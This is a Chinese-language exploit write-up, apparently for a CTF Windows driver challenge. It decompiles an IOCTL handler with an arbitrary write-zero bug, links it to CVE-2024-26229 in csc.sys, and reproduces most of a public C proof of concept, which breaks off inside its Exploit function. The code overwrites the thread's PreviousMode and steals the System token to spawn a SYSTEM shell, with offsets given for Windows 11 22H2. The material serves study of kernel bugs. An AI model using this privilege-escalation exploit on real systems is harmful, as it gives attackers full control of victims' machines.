DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)func;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      IoDeleteDevice(DeviceObject);</span><br><span class="line">      <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IOCTL函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">func</span><span class="params">(__int64 a1, IRP *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_STACK_LOCATION</span> *<span class="title">CurrentStackLocation</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// edi</span></span><br><span class="line">  DWORD LowPart; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = a2-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CurrentStackLocation-&gt;Parameters.Create.Options == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LowPart = CurrentStackLocation-&gt;Parameters.Read.ByteOffset.LowPart;</span><br><span class="line">    <span class="keyword">if</span> ( LowPart == <span class="number">0x222450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrint(<span class="string">&quot;Hello world!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( LowPart == <span class="number">0x223450</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      vuln_write(a2-&gt;AssociatedIrp.MasterIrp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;Error IOCTL Code\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0xC0000229</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0LL</span>;</span><br><span class="line">  a2-&gt;IoStatus.Status = v3;</span><br><span class="line">  IofCompleteRequest(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们看到这个LowPart是0x223450的时候调用的函数是对参数解引用两次后任意地址写0（这其实就是cve26229的青春版，只是那个要逆向一个真实的服务，这里就简化了而已）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.text:00000001400010AC ;   __try &#123; // __except at loc_1400010B3</span><br><span class="line">.text:00000001400010AC                 mov     rax, [rcx]</span><br><span class="line">.text:00000001400010AF                 mov     [rax], bl ; vuln</span><br><span class="line">.text:00000001400010B1                 jmp     short loc_1400010C4</span><br><span class="line">.text:00000001400010B1 ;   &#125; // starts at 1400010AC</span><br></pre></td></tr></table></figure><h2 id="一些windows驱动相关的知识">一些windows驱动相关的知识</h2><ul class="lvl-0"><li class="lvl-2"><p>IO设备在Windows以一个类似栈的结构堆叠起来，io请求从上到下处理，处理完毕就返回要么就传递给下一层（具体实现不懂，大概这么个思想）</p></li><li class="lvl-2"><p>windows将每一个io请求打包成一个IRP结构传入设备栈</p></li><li class="lvl-2"><p>它的if判断条件似乎是文件的读偏移（IDA F5是这么说的，不过反正最后poc传ioctl代码的时候也传一下就行，无所谓）</p></li><li class="lvl-2"><p>交互其实可以用Ntdll泄露拿函数或者是直接用包装好的也行：<code>DeviceIOControl()</code></p></li></ul><p>下面说一下传入的那个写0的地址我们怎么控制。这个参数IDA识别出是IRP请求的AssociateIRP域下的masterirp。这个AssociateIRP其实是个联合体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>* <span class="title">MasterIrp</span>;</span>                                             <span class="comment">//0x18</span></span><br><span class="line">        LONG IrpCount;                                                      <span class="comment">//0x18</span></span><br><span class="line">        VOID* SystemBuffer;                                                 <span class="comment">//0x18</span></span><br><span class="line">    &#125; AssociatedIrp;   </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在驱动程序创建的时候，如果是METHOD_BUFFERED类型，就会启用第三个域，也就是一个buffer指针</p><blockquote><p>参考自<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/buffer-descriptions-for-i-o-control-codes">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/buffer-descriptions-for-i-o-control-codes</a><br>对于此传输类型，IRP 提供指向 Irp-AssociatedIrp.SystemBuffer&gt; 处缓冲区的指针。 此缓冲区表示在调用 DeviceIoControl 和 IoBuildDeviceIoControlRequest 时指定的输入缓冲区和输出缓冲区。 驱动程序将数据从此缓冲区中传输出去，然后传入此缓冲区。</p><p>对于输入数据，缓冲区大小由驱动程序IO_STACK_LOCATION结构中的 Parameters.DeviceIoControl.InputBufferLength 指定。 对于输出数据，缓冲区大小由驱动程序IO_STACK_LOCATION结构中的 Parameters.DeviceIoControl.OutputBufferLength 指定。</p><p>系统为单个输入/输出缓冲区分配的空间大小是两个长度值中的较大值。</p></blockquote><p>从微软文档能看到，这里其实就是我们在IOCTL的时候传入的输入输出缓冲区。因此只要我们在用户态把缓冲区写好成指向我们拿到的_KTHREAD的PreviousMode，写0后就能利用任意地址写NtWriteVirtualMemory把System(pid 4)的token偷过来，然后重新将PreviousMode写成用户，调用<code>system(&quot;cmd&quot;)</code>即可拿到system shell。</p><h1>CVE-2024-26229</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-282185.htm">https://bbs.kanxue.com/thread-282185.htm</a><br>那么既然都懂了，我们简单看看实际环境下的漏洞复现是怎么样的。原理不用重复，这个CVE用的是Windows上的csc.sys驱动或者说服务。</p></blockquote><blockquote><p>csc.sys驱动是一个处理客户端缓存（Client-Side Caching）和提供离线文件功能的系统驱动（windows默认启用）。csc.sys允许用户在断网的情况下继续访问和操作网络文件，当用户在没有网络连接的情况下对这些文件进行更改时，这些更改首先影响的是本地缓存的副本；一旦网络连接恢复，CSC.sys 会负责将这些本地更改同步回网络位置，确保网络上的数据与本地的副本保持一致。</p></blockquote><p>这个驱动有一个处理文件的函数<code>csc!CscDevFcbXXXControlFile</code>存在问题（只是IOCTL变成文件操作码，用<code>NtFsControlFile</code>控制，逻辑和参数都基本一样）。在传入操作码0x001401a3后会有如下逻辑调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">0x20C</span>) == <span class="number">0x1401A3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = *(_QWORD *)(a1 + <span class="number">0x218</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">0xB8</span>) = <span class="number">0</span>i64;</span><br><span class="line">  *(_QWORD *)(v10 + <span class="number">0x18</span>) = <span class="number">0</span>i64; <span class="comment">// 漏洞利用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处第二个写0利用的是我们传入的input buffer（和这道题一模一样），因此只需要：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">status = pNtFsControlFile(</span><br><span class="line">    handle,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    &amp;iosb,</span><br><span class="line">    <span class="number">0x001401a3</span>,</span><br><span class="line">    (<span class="type">void</span>*)(Curthread + <span class="number">0x232</span> - <span class="number">0x18</span>), <span class="comment">// 漏洞利用</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>即可实现写0.</p><h1>POC</h1><p>VisualStudio 2022，参考自<a href="https://github.com/RalfHacker/CVE-2024-26229-exploit/blob/main/exploit.c">Github上的CVE-2024-26229 Poc</a>. 前面的部分基本没改，查了EPROCESS的token偏移和Ktrhead的PreviousMode偏移在win11 22H2下都是对的，没变化，直接用就好了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CVE-2024-26229 reuse</span></span><br><span class="line"><span class="comment">// https://github.com/RalfHacker/CVE-2024-26229-exploit/blob/main/exploit.c</span></span><br><span class="line"><span class="comment">// PreviousMode覆写提权</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPROCESS_TOKEN_OFFSET0x4B8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KTHREAD_PREVIOUS_MODE_OFFSET0x232</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformation0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemHandleInformationSize0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> _<span class="title">MODE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">KernelMode = <span class="number">0</span>,</span><br><span class="line">UserMode = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">USHORT UniqueProcessId;</span><br><span class="line">USHORT CreatorBackTraceIndex;</span><br><span class="line">UCHAR ObjectTypeIndex;</span><br><span class="line">UCHAR HandleAttributes;</span><br><span class="line">USHORT HandleValue;</span><br><span class="line">PVOID Object;</span><br><span class="line">ULONG GrantedAccess;</span><br><span class="line">&#125; SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_HANDLE_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ULONG NumberOfHandles;</span><br><span class="line">SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtWriteVirtualMemory)</span><span class="params">(HANDLE, PVOID, PVOID, ULONG, PULONG)</span>;</span><br><span class="line">_NtWriteVirtualMemory pNtWriteVirtualMemory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtQuerySystemInformation)</span><span class="params">(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG)</span>;</span><br><span class="line">_NtQuerySystemInformation pNtQuerySystemInformation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _RtlInitUnicodeString)</span><span class="params">(PUNICODE_STRING, PCWSTR)</span>;</span><br><span class="line">_RtlInitUnicodeString pRtlInitUnicodeString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtFsControlFile)</span><span class="params">(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG)</span>;</span><br><span class="line">_NtFsControlFile pNtFsControlFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtCreateFile)</span><span class="params">(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG)</span>;</span><br><span class="line">_NtCreateFile pNtCreateFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(__stdcall* _NtDeviceIoControlFile)</span><span class="params">(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG)</span>;</span><br><span class="line">_NtDeviceIoControlFile pNtDeviceIoControlFile;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">NtLoad</span><span class="params">()</span> &#123;</span><br><span class="line">HMODULE hModule = GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hModule != <span class="number">0</span>) &#123;</span><br><span class="line">pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hModule, <span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtWriteVirtualMemory)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtWriteVirtualMemory not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hModule, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtQuerySystemInformation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtQuerySystemInformation not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hModule, <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pRtlInitUnicodeString)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] RtlInitUnicodeString not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtFsControlFile = (_NtFsControlFile)GetProcAddress(hModule, <span class="string">&quot;NtFsControlFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtFsControlFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtFsControlFile not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtCreateFile = (_NtCreateFile)GetProcAddress(hModule, <span class="string">&quot;NtCreateFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtCreateFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtCreateFile not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtDeviceIoControlFile = (_NtDeviceIoControlFile)GetProcAddress(hModule, <span class="string">&quot;NtDeviceIoControlFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtDeviceIoControlFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtDeviceIoControlFile not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NTDLL not loaded\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetObjPtr</span><span class="params">(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> Ret = <span class="number">-1</span>;</span><br><span class="line">PSYSTEM_HANDLE_INFORMATION pHandleInfo = <span class="number">0</span>;</span><br><span class="line">ULONG ulBytes = <span class="number">0</span>;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &amp;ulBytes)) == <span class="number">0xC0000004</span>L)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pHandleInfo != <span class="literal">NULL</span>)</span><br><span class="line">pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (<span class="type">size_t</span>)<span class="number">2</span> * ulBytes);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (<span class="type">size_t</span>)<span class="number">2</span> * ulBytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Status != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = Status;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pHandleInfo-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((pHandleInfo-&gt;Handles[i].UniqueProcessId == ulPid) &amp;&amp; (pHandleInfo-&gt;Handles[i].HandleValue == (<span class="type">unsigned</span> <span class="type">short</span>)handle))</span><br><span class="line">&#123;</span><br><span class="line">*ppObjAddr = (ULONG64)pHandleInfo-&gt;Handles[i].Object;</span><br><span class="line">Ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Write64</span><span class="params">(_In_ <span class="type">uintptr_t</span>* Dst, _In_ <span class="type">uintptr_t</span>* Src, _In_ <span class="type">size_t</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS Status = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> cbNumOfBytesWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">Status = pNtWriteVirtualMemory(GetCurrentProcess(), Dst, Src, Size, &amp;cbNumOfBytesWrite);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtWriteVirtualMemory failed with status = %x\n&quot;</span>, Status);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Exploit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING  objectName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">OBJECT_ATTRIBUTES objectAttr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">IO_STATUS_BLOCK iosb = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE handle;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uintptr_t</span> Sysproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uintptr_t</span> Curproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uintptr_t</span> Curthread = <span class="number">0</span>;</span><br><span class="line"><span class="type">uintptr_t</span> Token = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hCurproc = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> Ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint8_t</span> mode = UserMode;</span><br><span class="line">LARGE_INTEGER offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pRtlInitUnicodeString(&amp;objectName, 